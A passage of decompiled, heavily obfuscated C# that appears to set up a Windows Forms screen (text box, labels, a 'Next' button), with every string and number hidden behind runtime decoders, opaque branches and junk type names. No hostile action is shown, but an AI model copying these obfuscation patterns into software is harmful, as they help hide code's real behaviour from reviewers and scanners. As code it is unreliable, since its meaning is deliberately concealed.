		object[] array178 = new object[4];
		array178[(uint)array[2]] = Convert.ToInt32(char.ToString('2') + char.ToString('4') + "11", 16);
		array178[(nint)((Array)(object)"\u0339").LongLength] = (char)_003CModule_003E.ActivityOptions[36];
		array178[2] = 33448;
		array178[3] = (char)Marshal.SizeOf(typeof(get_TextInfo));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_178, array178);
		int num251 = Convert.ToInt32(string_178, Convert.ToInt32(char.ToString('4') + char.ToString('2') + "1205", 8) >> Marshal.SizeOf(typeof(VT_UNKNOWN)));
		int num252 = ((AssemblyDefaultAliasAttribute >= -85934) ? 1276994345 : 630018);
		int num253 = ((68433 <= Marshal.SizeOf(typeof(IsFlowSuppressed))) ? 157751 : array2[201]);
		array177[num251] = (num252 / num253) & (-724618 + LessThanOrEqualAny);
		string string_179 = "\uee29";
		object[] array179 = new object[Convert.ToInt32("e42c0df", 16) / _003CModule_003E.KeyValuePair__2[177]];
		int num254 = default(int);
		switch (checked(Marshal.SizeOf(typeof(ShiftRightArithmeticAddScalar)) - Marshal.SizeOf(typeof(ShiftRightArithmeticAddScalar))))
		{
		case 0:
			num254 = 0;
			break;
		case 1:
			num254 = 704906;
			break;
		}
		array179[num254] = 'л';
		array179[Marshal.SizeOf(typeof(UseHebrewParsing))] = 'क़';
		array179[2] = array[_003CModule_003E.get_PositiveSign[109]];
		array179[Convert.ToInt32("11", 2)] = Convert.ToInt32("10" + "000" + "10001011001", 2);
		array179[4] = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(IDeserializationCallback))), char.ToString('ˢ'), char.ToString('ǀ') + char.ToString('6') + "\v>");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_179, array179);
		int num255 = array6[Convert.ToInt32(string_179, array2[0])];
		int num256 = array2[202] / 246883;
		char c49 = (char)num256;
		array177[num255] = (char)(int)c49;
		string string_180 = "☵";
		object[] array180 = new object[(uint)array[1]];
		array180[0] = 0x1FFB & EnvironmentVariableTarget;
		array180[~HexIntPtrType] = 2228;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_180, array180);
		int num257 = Convert.ToInt32(string_180, (checked(589258 - Marshal.SizeOf(typeof(get_ReplacementChar))) == 30766) ? 8 : get_ScheduledConcurrent);
		string string_181 = string.Concat(char.ToString('\uda2a'), char.ToString('\uda2b'), char.ToString('\uda2b') + char.ToString('\uda2b') + "\uda2b\uda2a\uda2a\uda2b\uda2a");
		object[] array181 = new object[FlattenHierarchy];
		array181[Convert.ToInt32("0", 2)] = Marshal.SizeOf(typeof(Flags));
		array181[1] = (byte)Convert.ToInt32("0", 8) != 0;
		array181[2] = array[101] * 1;
		array181[Convert.ToInt32("11", 2)] = 963097 + Convert.ToInt32("37774271756", 8);
		array181[4] = Convert.ToInt32("100101100001010100", 2) ^ 0x2DC82;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_181, array181);
		string text127 = char.ToString((char)Convert.ToInt32(string_181, Convert.ToInt32("2", 16)));
		string string_182 = "젚직";
		object[] array182 = new object[5];
		array182[0] = 7410;
		array182[1122325 >> (int)((Array)(object)"\u0305\u0355\u0345\u0353\u0347\u0349\u032a\u0365\u0316\u0312\u0325\u0355\u035e\u036b\u0332\u036c\u032c\u0364\u0342\u033b").LongLength] = Convert.ToInt32("37776631533", 8) - _003CModule_003E.get_PositiveSign[169];
		array182[sizeof(ushort)] = string.Concat("ᅘ\u0c5e", char.ToString('®') + "s\v\u0003\u0002");
		array182[endAction] = '\u2451';
		array182[sizeof(uint)] = (byte)array2[1] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_182, array182);
		string text128 = string_182;
		string string_183 = string.Concat(char.ToString('피'), char.ToString('피') + "픽픿");
		object[] array183 = new object[Marshal.SizeOf(typeof(OverlappedData))];
		array183[0] = 347;
		array183[1] = string.Concat(char.ToString('8'), char.ToString((char)((Array)(object)".").Length), char.ToString('\u0002') + "\u0005\u0002\u0003");
		array183[_003CModule_003E.ActivityOptions[0]] = '뱉';
		array183[Convert.ToInt32("11111111111111111111111111111101", 2) * array2[99]] = 432;
		array183[get_IsJITTrackingEnabled % 8] = string.Concat(char.ToString('ఢ'), char.ToString('ޑ'), char.ToString('\u007f') + "Õ\u009d");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_183, array183);
		array177[num257] = string.Concat(text127, text128 + string_183);
		_003CModule_003E.GetMaxByteCount(ref string_177, array177);
		((Control)overwriteExisting3).set_Name(string_177);
		((TextBoxBase)OverwriteExisting).set_ReadOnly((byte)checked(array6[unchecked((nint)((Array)(object)"\u036d").LongLength)] * unchecked((int)array4[checked(-868194 + int_2)])) != 0);
		TextBox overwriteExisting4 = OverwriteExisting;
		int width6 = Convert.ToInt32("377" + "63322141", 8) % -1320102 + 660254;
		string string_184 = string.Concat(char.ToString('粱') + "粰粱", "粰粰粰粰粰粰粱" + "粰粰粱粰粱粱粰粱粰粰粰粰粱粰粰粰粰粱粱粰粰");
		object[] array184 = new object[(uint)array[6]];
		array184[0] = false;
		array184[1] = 2861;
		array184[(-57855 != Convert.ToInt32("37777617001", 8)) ? 746608 : array2[0]] = array2[UserDomainName];
		array184[3] = '௮';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_184, array184);
		((Control)overwriteExisting4).set_Size(new Size(width6, Convert.ToInt32(string_184, 2) / 67232167));
		((Control)OverwriteExisting).set_TabIndex(_003CModule_003E.CalendarType[4]);
		((Control)OverwriteExisting).set_TabStop((byte)SAKA != 0);
		Label obj20 = get_CanRead;
		char c50 = (char)Convert.ToInt32("1", 8);
		int num258 = c50;
		((Control)obj20).set_AutoSize((byte)checked(num258 * sizeof(byte)) != 0);
		Label obj21 = get_CanRead;
		string text129 = char.ToString((char)checked((-679547 ^ _003CModule_003E.get_PositiveSign[170]) * 149));
		string string_185 = "뇯뇭";
		object[] obj22 = new object[2] { 3819, null };
		int num259 = Convert.ToInt32("1", 2);
		int num260 = Convert.ToInt32("25727", 8);
		obj22[num259] = num260;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_185, obj22);
		string text130 = string_185;
		string string_186 = string.Concat(char.ToString('솻'), char.ToString('솱') + "쇴솁솝");
		object[] array185 = new object[Convert.ToInt32("3", 8)];
		array185[Convert.ToInt32("37775411315", 8) + 650547] = 7780;
		int num261 = _003CModule_003E.ActivityOptions[154] + -490798;
		int num262 = ((Convert.ToInt32("941f", 16) != -50887) ? 4237 : 447134);
		array185[num261] = (char)num262;
		array185[(25863 == Convert.ToInt32("37777642643", 8)) ? 536817 : sizeof(ushort)] = 1772187849 / Convert.ToInt32("750533", 8);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_186, array185);
		string string_187 = string.Concat(text129, text130 + string_186);
		char c51 = array4[(uint)array[_003CModule_003E.ActivityOptions[8]]];
		object[] array186 = new object[(uint)c51];
		int num263 = default(int);
		switch ((Convert.ToInt32("1731442306", 8) + Convert.ToInt32("110100100111111100", 2)) / 258576066)
		{
		case 0:
			num263 = checked(876019 + _003CModule_003E.get_PositiveSign[171]);
			break;
		case 1:
			num263 = 305850 + Convert.ToInt32("11111111111110110101010101000110", 2);
			break;
		}
		array186[num263 / -90] = (int)array4[8];
		int num264 = array4[1] & 1;
		int num266;
		if (84464 <= _003CModule_003E.CalendarType[Convert.ToInt32("6a077e22", 16) / 98826441])
		{
			int num265 = ((96678 >= array2[203]) ? (-474359) : (-156));
			num266 = ~num265;
		}
		else
		{
			string string_188 = string.Concat(char.ToString('\uf6ec'), char.ToString('\uf6be') + char.ToString('\uf6b9') + "\uf6e6\uf6ed");
			object[] array187 = new object[array2[6]];
			array187[0] = Convert.ToInt32("11" + char.ToString('1') + "0000010111", array2[0]);
			array187[1] = (char)('᧿' & array[102]);
			array187[checked(-875904 + _003CModule_003E.KeyValuePair__2[178])] = array2[204] >> 8;
			array187[3] = '\u02d4';
			int num267 = Convert.ToInt32("100", 2);
			char c52 = (char)_003CModule_003E.get_PositiveSign[172];
			array187[num267] = (char)(int)c52;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_188, array187);
			num266 = Convert.ToInt32(string_188, 80 % Convert.ToInt32("20", 16));
		}
		array186[num264] = num266;
		array186[2] = FallbackBuffer / (sizeof(byte) & 1) * -3;
		int[] loadVector2 = _003CModule_003E.LoadVector128;
		char c53 = (char)array2[0];
		char num268 = array4[loadVector2[(int)c53]];
		int num269 = array2[50];
		int num270 = ((7863 > Marshal.SizeOf(typeof(ProcessID))) ? (-599319) : (-225987));
		int num271 = ((num269 >= num270) ? (-226575 ^ Convert.ToInt32("fff50511", 16)) : (Convert.ToInt32("3b94a8", 16) % 1561872));
		string string_189 = string.Concat("芻芺", "芺芻芺" + "芺芻" + "芺芻芻芻芻芻芻芻芺芺芻芻芺");
		object[] array188 = new object[4];
		array188[0] = (int)array[41];
		array188[1] = 501;
		array188[2] = false;
		array188[(nint)((Array)(object)(char.ToString('\u035d') + "\u0351\u0314")).LongLength] = (char)_003CModule_003E.KeyValuePair__2[43];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_189, array188);
		array186[(uint)num268] = (char)checked(num271 - Convert.ToInt32(string_189, 2));
		_003CModule_003E.GetMaxByteCount(ref string_187, array186);
		string text131 = string_187;
		int num272 = default(int);
		switch (Convert.ToInt32("0", 2) / -577)
		{
		case 0:
			num272 = -503826;
			break;
		}
		int num273 = num272 & -12547;
		int num274 = list;
		int num275 = num274;
		int num276 = num273 + num275;
		int preserveBaseOverridesAttribute = PreserveBaseOverridesAttribute;
		char c54 = (char)Convert.ToInt32("0", 8);
		int num277 = c54;
		int num278 = _003CModule_003E.get_PositiveSign[173];
		((Control)obj21).set_Font(new Font(text131, 10f, (FontStyle)num276, (GraphicsUnit)preserveBaseOverridesAttribute, (byte)(num277 & (num278 + (0x52440 | Marshal.SizeOf(typeof(VT_RECORD)))))));
		((Control)get_CanRead).set_ForeColor(SystemColors.Control);
		Label obj23 = get_CanRead;
		int num279 = -538781 + array2[51];
		int num280 = default(int);
		checked
		{
			switch (unchecked(Marshal.SizeOf(typeof(PERSIAN)) + -392932) * Convert.ToInt32(char.ToString('f') + char.ToString('f') + "ffffff", 16))
			{
			case 0:
				num280 = get_DeclaredNestedTypes * 19;
				break;
			case 1:
				num280 = -677355;
				break;
			case 2:
			{
				int transcodeToUtf = TranscodeToUtf16;
				num280 = transcodeToUtf;
				break;
			}
			case 3:
				num280 = unchecked(Out / Marshal.SizeOf(typeof(UseHebrewParsing)));
				break;
			}
		}
		int x5 = num279 - num280;
		char c55 = (char)Convert.ToInt32("31", 16);
		string text132 = char.ToString((char)(int)c55);
		string string_190 = "\ua7f1Ꞣ";
		char c56 = (char)_003CModule_003E.ActivityOptions[0];
		object[] array189 = new object[(int)c56];
		int num281 = ((Convert.ToInt32("11111111111111110010011111011001", 2) < -845797) ? 414251 : 0);
		array189[num281] = 29231;
		array189[(nint)((Array)(object)"\u036e").LongLength] = 13667;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_190, array189);
		((Control)obj23).set_Location(new Point(x5, Convert.ToInt32(text132 + string_190, Convert.ToInt32("fff" + "10425", 16) - -981995)));
		Label obj24 = get_CanRead;
		string text133 = char.ToString((char)checked((Convert.ToInt32("11111111111110111110110110111110", 2) & -266805) + ((8146 <= TryFormatUInt32) ? DefineLiteral : (-176357))));
		char c57 = array[103];
		string text134 = char.ToString(c57);
		string string_191 = char.ToString('\ufbbf') + char.ToString('\ufbb8') + "ﮱﯫ";
		object[] array190 = new object[_003CModule_003E.ActivityOptions[3]];
		array190[Convert.ToInt32("0", 16)] = 5246;
		array190[1] = -6221 * Convert.ToInt32("ffffffff", 16);
		array190[2] = 25312;
		array190[Convert.ToInt32("3", 16) & 3] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_191, array190);
		string string_192 = string.Concat(text133, text134 + string_191);
		object[] array191 = new object[_003CModule_003E.LoadVector128[(nint)((Array)(object)"\u0333").LongLength] & (3 & _003CModule_003E.KeyValuePair__2[0])];
		int num282 = ~checked(-101867 * Marshal.SizeOf(typeof(IsValidText))) - ((Convert.ToInt32("37777316733", 8) - -600940) ^ ~Convert.ToInt32("11111111111111110000000100010011", 2));
		int num286;
		string string_193;
		object[] array192;
		checked
		{
			int num283 = default(int);
			switch ((_003CModule_003E.KeyValuePair__2[179] | -136641510) - -326118)
			{
			case 0:
				num283 = 33303;
				break;
			}
			array191[num282] = ((num283 != Marshal.SizeOf(typeof(continuationOptions))) ? (unchecked(489029 + Convert.ToInt32("2652073", 8)) + ((array2[206] != 28437) ? 346805 : (-984684))) : (unchecked(array2[205] / 2566) - array2[52]));
			int num284 = (((array2[207] ^ 0x991EE) != 518060260 >> Convert.ToInt32("15", 8)) ? 36123 : 936928);
			int num285 = Convert.ToInt32("bea05", 16);
			num286 = num284 + (-747293 ^ num285);
			string_193 = "\u0900┒";
			array192 = new object[Convert.ToInt32("1613202", 8) - 464511];
			array192[IMemoryOwner__1 + -620408] = string.Concat(char.ToString('!'), char.ToString('\r') + "\u0006\u0010");
			array192[~Convert.ToInt32("37777777776", 8)] = array[62] & match;
		}
		char c58 = (char)Convert.ToInt32("10", 2);
		array192[(uint)c58] = (byte)array2[Convert.ToInt32("1", 8)] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_193, array192);
		array191[num286] = string_193;
		string string_194 = string.Concat(char.ToString('\uda50'), char.ToString('\uda51'), char.ToString('\uda0d') + "\uda06\uda07");
		object[] array193 = new object[Convert.ToInt32("100001001111000011000100111000", 2) / 139398222];
		array193[(nint)((Array)(object)string.Empty).LongLength * Convert.ToInt32("ffff842b", 16)] = 2746;
		int num287 = MethodTable / 1748602070;
		int num288 = Convert.ToInt32("100100001000011", 2);
		array193[num287] = num288;
		array193[2] = string.Concat(char.ToString('䋀'), char.ToString('\u0df6') + "ᓯ\u07b0");
		array193[endAction] = (int)array[42];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_194, array193);
		int num289 = checked(Convert.ToInt32(string_194, Convert.ToInt32("10", 16)) + -911649);
		string text135 = char.ToString((char)array6[24]);
		string text136 = char.ToString('Õ');
		string text137 = char.ToString((char)((Convert.ToInt32("10b8c", 16) <= -832224) ? 4294681695u : '\u032d'));
		string string_195 = string.Concat(char.ToString((char)Convert.ToInt32("1000000011101110", 2)), char.ToString('臋') + "臛臘");
		object[] array194 = new object[array2[Convert.ToInt32("5", 8)]];
		array194[0] = 5008;
		array194[1] = GetRemainingCount * Convert.ToInt32("5", 16);
		array194[array2[0]] = 25899;
		array194[260850 >> (int)array[55]] = (byte)(Convert.ToInt32("6bc2b", 16) + Convert.ToInt32("37776241725", 8)) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_195, array194);
		array191[num289] = string.Concat(text135, text136, text137 + string_195);
		_003CModule_003E.GetMaxByteCount(ref string_192, array191);
		((Control)obj24).set_Name(string_192);
		Label obj25 = get_CanRead;
		bool num290 = F_WRLCK == 85940;
		string string_196 = "ঝ";
		object[] array195 = new object[4];
		array195[get_PositiveInfinity] = "Ʒ?";
		array195[1] = 1639;
		array195[2] = (char)Convert.ToInt32(char.ToString('4') + "23", 8);
		array195[Marshal.SizeOf(typeof(CharSetMask))] = "\u001b\"";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_196, array195);
		string value11 = string_196;
		int fromBase6 = ((((-43163 == Convert.ToInt32("37777507116", 8)) ? 1 : 0) != array2[1]) ? 795765 : array2[97]);
		int width7 = (((num290 ? 1 : 0) != Convert.ToInt32(value11, fromBase6)) ? _003CModule_003E.LoadVector128[25] : _003CModule_003E.Dequeue[16]);
		((Control)obj25).set_Size(new Size(width7, 19));
		Label obj26 = get_CanRead;
		string string_197 = "\udfc3";
		object[] array196 = new object[Marshal.SizeOf(typeof(IsValidText))];
		array196[0] = 7545;
		array196[_003CModule_003E.ActivityOptions[2]] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
		array196[(nint)((Array)(object)"\u0352\u036a").LongLength] = (char)(_003CModule_003E.KeyValuePair__2[180] - -78583);
		array196[3] = (char)('ﯷ' & array[104]);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_197, array196);
		string value12 = string_197;
		string string_198 = "\ue4a2\ue4a0";
		object[] array197 = new object[3];
		int num291 = default(int);
		switch (901548 - array2[208])
		{
		case 0:
			num291 = 0;
			break;
		}
		array197[num291] = 0x21B0 | Marshal.SizeOf(typeof(TComparer));
		array197[1] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
		array197[Convert.ToInt32("10", 2)] = '슘';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_198, array197);
		((Control)obj26).set_TabIndex(Convert.ToInt32(value12, Convert.ToInt32(string_198, Marshal.SizeOf(typeof(__c__DisplayClass0_6)))));
		Label obj27 = get_CanRead;
		int[] dequeue4 = _003CModule_003E.Dequeue;
		char c59 = (char)Marshal.SizeOf(typeof(LunarCalendar));
		string text138 = char.ToString((char)dequeue4[(uint)c59]);
		string text139 = char.ToString('⯪');
		string string_199 = "ᑾᑯ";
		object[] array198 = new object[3];
		array198[array2[1]] = false;
		string text140;
		string text141;
		string string_200;
		object[] array199;
		checked
		{
			array198[Convert.ToInt32("3014505", 8) + -792900] = string.Concat(char.ToString('\u08ce'), char.ToString('\u09d6') + char.ToString('೬') + "\u034f\u05a1");
			array198[_003CModule_003E.KeyValuePair__2[181] + -747066] = ((Overlapped != -90829) ? array2[209] : Marshal.SizeOf(typeof(MakeDataType)));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_199, array198);
			text140 = text139 + string_199;
			text141 = char.ToString('⯶');
			string_200 = string.Concat(char.ToString('\ue552') + "\ue556\ue502", char.ToString('\ue544') + char.ToString('\ue54b') + "\ue54e\ue547\ue551");
			array199 = new object[4];
			array199[Convert.ToInt32("0", 2)] = 2273;
			array199[1] = 37573;
		}
		array199[2] = (byte)Convert.ToInt32("0", 16) != 0;
		array199[Convert.ToInt32("10100010010101000", 2) + _003CModule_003E.get_PositiveSign[174]] = 1712220797 >> (int)((Array)(object)"\u0351\u032e\u0326\u0357\u0359\u0346\u031f\u035e\u034e\u0336\u030e\u0320\u0365\u0359\u0304\u031e\u0341").LongLength;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_200, array199);
		string string_201 = string.Concat(text138, text140, text141 + string_200);
		int num292 = _003CModule_003E.get_PositiveSign[8] % (Convert.ToInt32("37775723765", 8) - Convert.ToInt32("11111111111101111010011111101011", 2));
		object[] array200 = new object[num292];
		int num293 = ~(-984157 + Convert.ToInt32("11110" + "0000" + "10001011100", 2));
		int num294 = default(int);
		switch (get_PositiveInfinity / -431)
		{
		case 0:
			num294 = 53;
			break;
		case 1:
			num294 = _003CModule_003E.ActivityOptions[155];
			break;
		}
		string text142 = char.ToString((char)num294);
		string string_202 = "\ue233\ue235";
		object[] array201 = new object[6];
		array201[(nint)((Array)(object)string.Empty).LongLength] = string.Concat(char.ToString((char)_003CModule_003E.get_PositiveSign[137]), char.ToString('ǘ'), char.ToString('Ր') + char.ToString('ʦ') + "߉o");
		int num295 = array2[2];
		array201[num295] = (char)('\0' | _003CModule_003E.ActivityOptions[91]);
		array201[Convert.ToInt32("10", array2[0])] = 47899;
		array201[3] = 4818;
		array201[Explicit / 218684961] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
		array201[Marshal.SizeOf(typeof(OverlappedData))] = 384;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_202, array201);
		array200[num293] = Convert.ToInt32(text142 + string_202, (int)(Permute2x128 * (nint)((Array)(object)"\u0304").LongLength - Convert.ToInt32("11011100" + "110111001101", 2)));
		int num296 = Marshal.SizeOf(typeof(IsTvOS));
		char c60 = (char)(StringToInt * ((63874 != Convert.ToInt32("fffec89c", 16)) ? 1 : 61646));
		array200[num296] = (int)c60;
		string string_203 = "⮁";
		object[] array202 = new object[checked(4 * _003CModule_003E.ActivityOptions[2])];
		int num297 = default(int);
		switch (Convert.ToInt32("5", 8) % 2)
		{
		case 0:
			num297 = Marshal.SizeOf(typeof(__9__65_0));
			break;
		case 1:
			num297 = Convert.ToInt32("0", 8);
			break;
		}
		array202[num297] = checked(-218 * Convert.ToInt32("11111111111111111111111111111001", 2));
		int num298 = ((Convert.ToInt32("11111111111111110011001100001111", 2) == Convert.ToInt32("37777631417", 8)) ? 1 : (-751061));
		array202[num298] = 1656;
		array202[2] = IsGenericMethod & 0x1ADE;
		array202[3] = (int)array[43];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_203, array202);
		array200[Convert.ToInt32(string_203, _003CModule_003E.ActivityOptions[37] + 227919)] = ~((Convert.ToInt32("1f39f", 16) ^ array2[210]) % array2[_003CModule_003E.KeyValuePair__2[158]]);
		int num299 = ((((_003CModule_003E.CalendarType[19] > (0x6FFFE & array2[(uint)array[65]])) ? 1 : 0) != (Convert.ToInt32("0", 8) | (0 / EventPipeSerializationFormat))) ? (-4929875 % add_EventCommandExecuted) : (15 % _003CModule_003E.get_PositiveSign[0]));
		array200[num299] = ((26870 < Marshal.SizeOf(typeof(PEFileKinds))) ? checked(727 * Convert.ToInt32("8", 16)) : (Convert.ToInt32(char.ToString('f') + char.ToString('f') + "f209bb", 16) * Convert.ToInt32(char.ToString('f') + char.ToString('f') + "ffffff", 16)));
		array200[checked((0x20044 | array2[211]) + (Convert.ToInt32("37777770576", 8) + -202192)) * (0x7A00A25 | Convert.ToInt32("376" + "67776732", 8))] = Marshal.SizeOf(typeof(MinValue));
		_003CModule_003E.GetMaxByteCount(ref string_201, array200);
		((Control)obj27).set_Text(string_201);
		((Control)Next).set_BackColor(SystemColors.ButtonHighlight);
		Button obj28 = Next;
		int[] loadVector3 = _003CModule_003E.LoadVector128;
		string string_204 = "\u09b4";
		object[] array203 = new object[3];
		array203[0] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
		array203[array2[Stream]] = Convert.ToInt32("110" + "10011110", ((Array)(object)"\u0310\u0347").Length);
		array203[checked(-2 * Convert.ToInt32("37777777777", 8))] = (int)array[44];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_204, array203);
		((ButtonBase)obj28).set_FlatStyle((FlatStyle)loadVector3[Convert.ToInt32(string_204, array2[Convert.ToInt32("0", 2)])]);
		Button obj29 = Next;
		string string_205 = "䯁";
		object[] array204 = new object[Convert.ToInt32("10", 2)];
		array204[checked(Convert.ToInt32("9e7c", 16) + -40572)] = (char)(_003CModule_003E.get_PositiveSign[175] & Convert.ToInt32("eba", 16));
		array204[Convert.ToInt32("1", 16)] = Convert.ToInt32(char.ToString('3') + "d56", 16);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_205, array204);
		char x6 = array4[Convert.ToInt32(string_205, Convert.ToInt32("10", 16))];
		int num300 = default(int);
		switch (10 % Marshal.SizeOf(typeof(IsValidText)))
		{
		case 0:
			num300 = Convert.ToInt32("d8835", 16);
			break;
		case 1:
			num300 = Convert.ToInt32("af6e4", 16);
			break;
		case 2:
			num300 = _003CModule_003E.KeyValuePair__2[182];
			break;
		}
		((Control)obj29).set_Location(new Point(x6, (num300 * Convert.ToInt32("3777" + "7777427", sizeof(long))) ^ 0xBD12A));
		Button obj30 = Next;
		string text143 = char.ToString('諺');
		string text144 = char.ToString((char)(array2[55] * -5));
		string text145 = char.ToString('諬');
		string string_206 = char.ToString('\u08ec') + char.ToString('\u08f7') + "\u08f6ࢪ";
		object[] array205 = new object[checked(284034 + array2[212])];
		array205[0] = 33225;
		array205[1] = string.Concat(char.ToString('\''), char.ToString('\u0005') + "\u0002\0\u0005\u0002");
		array205[Marshal.SizeOf(typeof(ENODATA))] = string.Concat(char.ToString('\0'), char.ToString('\0') + "\0\u0002");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_206, array205);
		string string_207 = string.Concat(text143, text144, text145 + string_206);
		int num301 = ((array2[213] != CC_MAX) ? 69155 : 7127);
		char c61 = (char)num301;
		char num302 = c61;
		int num303 = Convert.ToInt32("6e0" + "02aa0", 16);
		int num304 = Convert.ToInt32("1010000000000000001111100000", 2);
		object[] array206 = new object[(int)num302 >> num303 / num304];
		int num305 = default(int);
		switch (5 % Convert.ToInt32("2", 16))
		{
		case 0:
			num305 = -665819;
			break;
		case 1:
			num305 = -915178;
			break;
		}
		int num306 = checked(-915178 - num305);
		string string_208 = "춅";
		object[] array207 = new object[5];
		array207[0] = char.ToString('\u001e') + "Ʃ\u001c";
		array207[1] = 'Δ';
		array207[Marshal.SizeOf(typeof(ENODATA))] = 48199;
		array207[array2[4]] = "\u0367ࠔ";
		array207[Convert.ToInt32("4", Convert.ToInt32("10000", 2))] = (char)((Convert.ToInt32("111010001101100", 2) > -693130) ? '|' : array2[214]);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_208, array207);
		int num307 = num306 | Convert.ToInt32(string_208, 2);
		int num308 = array2[56];
		bool num309 = 52284 < num308;
		string string_209;
		checked
		{
			int num310 = ((((Convert.ToInt32("1111" + "11" + "11111111111010111001100001", 2) < 864900 - Convert.ToInt32("172113", 8)) ? 1 : 0) != array2[1]) ? array2[1] : (-600177));
			int num312;
			if ((num309 ? 1 : 0) == num310)
			{
				int num311 = default(int);
				switch (Convert.ToInt32(char.ToString('e') + char.ToString('0') + "c80", sizeof(decimal)) + -920704)
				{
				case 0:
					num311 = 26222;
					break;
				}
				num312 = num311;
			}
			else
			{
				num312 = -234731;
			}
			array206[num307] = num312;
			string_209 = "쥑";
			object[] array208 = new object[unchecked((int)array[1]) * Convert.ToInt32("1", 8)];
			array208[get_PositiveInfinity] = _003CModule_003E.get_PositiveSign[50];
			array208[1] = '紺';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_209, array208);
		}
		array206[Convert.ToInt32(string_209, 2)] = (char)((uint)_003CModule_003E.LoadVector128[_003CModule_003E.ActivityOptions[85] & 0x1E] ^ (0xFFFFEF7Fu & (uint)Convert.ToInt32(char.ToString('f') + "ffce629", 16)));
		array206[2] = (int)array4[Convert.ToInt32("111111" + "1111" + "1111111111111111110110", 2) * -1];
		_003CModule_003E.GetMaxByteCount(ref string_207, array206);
		((Control)obj30).set_Name(string_207);
		Button obj31 = Next;
		int taskNode = TaskNode;
		string string_210 = string.Concat("\udaeb\udaeb", char.ToString('\udaeb') + char.ToString('\udab5') + "\udabd\udabe\udae8\udaef");
		object[] array209 = new object[Convert.ToInt32("4", 16)];
		array209[(uint)array[2]] = 30441;
		array209[get_CurrencyGroupSeparator] = (byte)(Convert.ToInt32("0", 2) / 489671540) != 0;
		array209[Convert.ToInt32("10", 2)] = AssemblyPath ^ -182612;
		array209[_003CModule_003E.KeyValuePair__2[0]] = (char)checked(Convert.ToInt32("11010110110", 2) * 8);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_210, array209);
		((Control)obj31).set_Size(new Size(75, checked(taskNode + Convert.ToInt32(string_210, 16))));
		Button obj32 = Next;
		string string_211 = "䄓";
		object[] array210 = new object[6];
		int num313 = ((40534 >= Convert.ToInt32("546130", 8)) ? 340846 : array2[1]);
		array210[num313] = false;
		array210[1] = Convert.ToInt32(char.ToString('d') + "15", 16);
		array210[~Convert.ToInt32("37777777775", 8)] = 4972;
		array210[Convert.ToInt32("1ccbe436", 16) >> _003CModule_003E.ActivityOptions[85]] = (char)Convert.ToInt32(char.ToString('7') + "12", 16);
		array210[4] = (char)Convert.ToInt32(char.ToString('1') + "16c", array[55]);
		char c62 = (char)Convert.ToInt32("5", 16);
		array210[(uint)c62] = ((71304 < array2[215]) ? 245232 : array2[216]);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_211, array210);
		int tabIndex3 = default(int);
		switch (checked(Convert.ToInt32(string_211, _003CModule_003E.KeyValuePair__2[183] ^ Convert.ToInt32("fff2ce03", 16)) * sizeof(byte)))
		{
		case 0:
			tabIndex3 = Marshal.SizeOf(typeof(CurrentValue));
			break;
		case 1:
			tabIndex3 = 2043715305 / array2[57];
			break;
		}
		((Control)obj32).set_TabIndex(tabIndex3);
		Button obj33 = Next;
		string text146 = char.ToString('喒');
		string string_212 = "迾迸";
		object[] array211 = new object[5];
		array211[0] = Narrow;
		array211[array2[2]] = array2[110] | 0x2CD9;
		array211[Convert.ToInt32("2", 8)] = 'Ǐ';
		char c63 = (char)((Array)(object)".\u0336.").Length;
		array211[(int)c63] = 0x2600 | Convert.ToInt32("11100001010110", 2);
		array211[4 | get_PositiveInfinity] = "䁗⮗";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_212, array211);
		string text147 = text146 + string_212;
		string string_213 = "羧羬";
		object[] array212 = new object[_003CModule_003E.get_PositiveSign[2]];
		array212[0] = (byte)array2[1] != 0;
		array212[1] = string.Concat(char.ToString('¶'), char.ToString('\u008d') + char.ToString('c') + "w\u001f");
		array212[2] = (char)(_003CModule_003E.KeyValuePair__2[184] / 1269908);
		array212[checked(Convert.ToInt32("11111111111101111010110010101111", 2) + 545620)] = '൴';
		array212[4] = MoveNext / 78727;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_213, array212);
		string text148 = string_213;
		string string_214 = "姵姱";
		object[] array213 = new object[5];
		int num314 = ((-78164 == Convert.ToInt32("37777504603", 8)) ? 978761 : _003CModule_003E.ActivityOptions[1]);
		array213[num314] = 1465 % _003CModule_003E.ActivityOptions[156];
		array213[1] = (char)Marshal.SizeOf(typeof(IntersectWith));
		array213[Marshal.SizeOf(typeof(ENODATA))] = 2334;
		array213[Marshal.SizeOf(typeof(MdSigCallingConvention)) % Marshal.SizeOf(typeof(Stelem_Ref))] = 271;
		array213[4] = -147 * Convert.ToInt32("11111111111111111111111111111111", 2);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_214, array213);
		string text149 = string_214;
		string string_215 = string.Concat("垈城", char.ToString('埁') + char.ToString('埄') + "埍埛");
